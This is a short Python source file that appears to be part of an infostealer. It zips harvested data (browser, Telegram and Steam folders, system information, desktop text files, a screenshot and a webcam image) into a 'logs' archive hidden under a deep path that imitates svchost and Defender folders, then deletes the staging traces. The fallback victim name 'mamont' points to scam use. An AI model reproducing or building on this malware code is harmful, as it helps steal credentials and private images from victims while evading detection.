import shutil
import os

def makemeZip():
	try:
		user = os.environ['USERPROFILE'].replace("C\\Users\\")
	except:
		user = 'mamont'
	shutil.make_archive(fr'windows__cache__\svchost\defender\daksldjlas\dsadsad\sd\dsa\ds\ds\ds\as\dsa\das\ds\sad\das\das\das\dsa\dsa\dsa\das\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\logs-{user}', 'zip', 'C:\\hesoyam8927163')
	shutil.rmtree(r'C:\hesoyam8927163\Chrome', ignore_errors=True)
	shutil.rmtree(r'C:\hesoyam8927163\Opera', ignore_errors=True)
	shutil.rmtree(r'C:\hesoyam8927163\Firefox', ignore_errors=True)
	shutil.rmtree(r'C:\hesoyam8927163\SystemInformation', ignore_errors=True)
	shutil.rmtree(r'C:\hesoyam8927163\Telegram', ignore_errors=True)
	shutil.rmtree(r'C:\hesoyam8927163\Steam', ignore_errors=True)
	shutil.rmtree(r'C:\hesoyam8927163\TxtFilesFromDesktop', ignore_errors=True)
	try:
		os.remove(r'C:\hesoyam8927163\sreenshot.jpg')
		os.remove(r'C:\hesoyam8927163\webcam.png')
	except:
		pass